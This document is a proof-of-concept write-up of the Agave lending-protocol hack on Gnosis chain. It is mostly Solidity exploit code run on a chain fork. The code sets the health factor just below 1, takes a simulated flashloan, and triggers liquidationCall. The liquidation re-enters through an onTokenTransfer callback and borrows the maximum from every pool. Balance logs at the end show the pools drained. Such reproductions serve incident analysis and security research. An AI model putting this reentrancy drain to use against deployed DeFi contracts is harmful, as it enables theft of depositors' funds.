# Agave 

## Whats agave?

Agave ($AGVE) is a decentralized money market protocol on the xDai chain, developed by the 1Hive community as a fork of Aave. Agave integrates features from 1Hive projects like Celeste and Honeyswap.

Users deposit tokens, receiving 'aTokens' that accrue interest and can be used as collateral for borrowing. This enables leveraged returns with lower fees than mainnet Ethereum. Agave expands 1Hive's offerings, allowing users to earn yield on Honeyswap liquidity tokens. Explore Agave's capabilities, including lending, borrowing, delegated borrowing, and flash loans/

## lost?

1.5 million usd

## poc 

```solidity
   function setUp() public {
        vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
        providerAddrs = ILendingPoolAddressesProvider(0xA91B9095eFa6C0568467562032202108e49c9Ef8);
        lendingPool = ILendingPool(providerAddrs.getLendingPool());
        priceOracle = IPriceOracleGetter(providerAddrs.getPriceOracle());
        console.log(providerAddrs.getPriceOracle());
        //Lets just mint weth to this contract for initial debt
        vm.startPrank(0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d); //the gnosis bridge address.
        wethLiqBeforeHack = getAvailableLiquidity(weth);
        //Mint initial weth funding
        WETH.mint(address(this), 2728.934387414251504146 ether);
        WETH.mint(address(this), 1);
        // Mint LINK funding
        LINK.mint(address(this), linkLendNum1);
        vm.stopPrank();

        //Approve funds
        LINK.approve(address(lendingPool), type(uint256).max);
        WETH.approve(address(lendingPool), type(uint256).max);
    }
```





```solidity
 function testExploit() public {
        //Call prepare and get it setup
        prepare();
        _logBalances("Before hack balances");
        console.log("healthf : %d", getHealthFactor());
        flashloanFundingWETH();
        _logBalances("After hack balances");
    }
```



 Prepare Phase:
   - Initial Condition: Ensure that the health factor is slightly above 1.
   - Transition: Advance time by one hour after the initial prepare.
   - Objective: Reduce the health factor to less than 1 in the next block.
   - Purpose: This step is essential for the liquidation call to work, as it requires a health factor below 1.



```solidity
  function prepare() public {
        //follow the flow of this TX https://gnosisscan.io/tx/0x45b2d71f5bbb17fa67341fdf30468f1de032db71760be0cf4df9bac316cda7cc

        uint256 balance = LINK.balanceOf(address(this));
        require(balance > 0, "no link");

        //Deposit weth to aave v2 fork
        lendingPool.deposit(link, linkLendNum1, address(this), 0);
        lendingPool.deposit(weth, wethlendnum2, address(this), 0);

        //Enable asset as collateral

        lendingPool.setUserUseReserveAsCollateral(link, true);
        lendingPool.setUserUseReserveAsCollateral(weth, true);

        //Borrow initial setup prepare debts
        lendingPool.borrow(link, linkDebt3, 2, 0, address(this));
        lendingPool.borrow(weth, wethDebt4, 2, 0, address(this));

        //Withdraw as per tx
        lendingPool.withdraw(link, linkWithdraw5, address(this));
    }
```


    2. Flashloan and Deposit Phase:
   - Action: Execute a flashloan and deposit tokens.
   - Exploited Assets: In this exploit, withdraw and borrow all funds from WETH and maximize borrowing from all available pools.


```solidity
  function flashloanFundingWETH() internal {
        this.uniswapV2Call(address(this), 2730 ether, 0, new bytes(0));
    }
```


```solidity
      function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        //We simulate a flashloan from uniswap for initial eth funding
        attackLogic(_amount0, _amount1, _data);
    }
```



```solidity
    function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        totalBorrowed = amountToken;
        console.log("Borrowed: %s WETH from Honey", totalBorrowed);
        //This will fast forward block number and timestamp to cause hf to be lower due to interest on loan pushing hf below one
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 1);
        console.log("healthfAfterAdjust : %d", getHealthFactor());
        //This will start the reentrancy with ontokentransfer call on .burn of the atoken
        lendingPool.liquidationCall(weth, weth, address(this), 2, false);
        //This will withdraw the funds from weth lending pool
        lendingPool.withdraw(weth, _logTokenBal(aweth), address(this));
        //Calculation of flashloan fees for uniswap v2 pair,we just emulate it here for continuity purposes
        uint256 amountRepay = ((amountToken * 1000) / 997) + 1;
        uint256 wethbal = WETH.balanceOf(address(this));
        uint256 remainingeth = wethbal > totalBorrowed ? 0 : totalBorrowed - wethbal;
        if (wethbal < totalBorrowed) {
            console.log("Remaining eth is %d", totalBorrowed - wethbal);
        }
        require(amountRepay < WETH.balanceOf(address(this)), "not enough eth");
        //For test case we just send it to address(1) to reduce the flashloan amount from us to get final assets
        WETH.transfer(address(1), amountRepay);
        console.log("Repay Flashloan for : %s WETH", amountRepay / 1e18);
    }
    
```



Now the attack contract would receive a call :




```solidity
        function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
        console.log("tokencall From: %s, Value: %d", _from, _value);
        //we only do the borrow call on liquidation call which is the second time the from is weth and value is 1
        if (_from == aweth && _value == 1) {
            calcount++;
        }
        if (calcount == 2 && _from == aweth && _value == 1) {
            borrowMaxtokens();
        }
    }
}

```




```solidity
    function maxBorrow(address asset, bool maxxx) internal {
        IERC20 assetX = IERC20(asset);
        uint256 assetXbal = assetX.balanceOf(address(this));
        uint256 reserveTokenbal = getAvailableLiquidity(asset);
        console.log("Amont of asset bal in atoken is %d", reserveTokenbal);
        uint256 BorrowAmount = maxxx ? reserveTokenbal - 1 : min(getMaxBorrow(asset, totalBorrowed), reserveTokenbal);
        if (BorrowAmount > 0) {
            console.log("Going to boorrow %d of asset %s", BorrowAmount, asset);
            lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
            uint256 diff = assetX.balanceOf(address(this)) - assetXbal;
            require(diff == BorrowAmount, "did not borrow any funds");
            console.log("borrowed %d successfully", BorrowAmount);
        } else {
            console.log("NO amount borrowed???");
        }
    }

```



```solidity
        function getMaxBorrow(address asset, uint256 depositedamt) public view returns (uint256) {
        // Get the LTV (Loan To Value) of the asset from the Aave Protocol
        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
        uint256 ltv = data.configuration.data & 0xFFFF;

        // Get the latest price of the WETH token from the Aave Oracle
        uint256 wethPrice = priceOracle.getAssetPrice(address(weth));
        console.log(ltv);

        // Adjust for token decimals
        uint256 totalCollateralValueInEth = (depositedamt * wethPrice) / (10 ** 18); // normalize the deposited amount to ETH

        // Calculate the maximum borrowable value
        uint256 maxBorrowValueInEth = (totalCollateralValueInEth * ltv) / 10_000; // LTV is scaled by a factor of 10000

        // Get the latest price of the borrowable asset from the Aave Oracle
        uint256 assetPriceInEth = priceOracle.getAssetPrice(asset);

        // Calculate the maximum borrowable amount, adjust it back to the borrowing asset's decimals
        uint256 maxBorrowAmount = (maxBorrowValueInEth * (10 ** 18)) / assetPriceInEth;
        uint256 scaleDownAmt =
            WETH.decimals() > IERC20(asset).decimals() ? WETH.decimals() - IERC20(asset).decimals() : 0;
        if (scaleDownAmt > 0) {
            return ((maxBorrowAmount / 10 ** scaleDownAmt) * 100) / 100;
        }
        return (maxBorrowAmount * 100) / 100;
    }

```



    3. Exploit Completion:
   - Result: Successful execution drains funds from the lending pool.




```solidity
  Before hack balances
  --- Start of balances --- 
  WETH Balance 2728934387414251504147
  aWETH Balance 1
  USDC Balance 0
  GNO Balance 0
  LINK Balance 766666666660000000
  WBTC Balance 0
  healthf : 1000000000007142895
  --- End of balances --- 



 After hack balances
  --- Start of balances --- 
  WETH Balance 567741240183600637391
  aWETH Balance 0
  USDC Balance 243667634985
  GNO Balance 8408675281445177303948
  LINK Balance 24588008766918391786643
  WBTC Balance 1678601870
  healthf : 1665963675123
  --- End of balances --- 

```
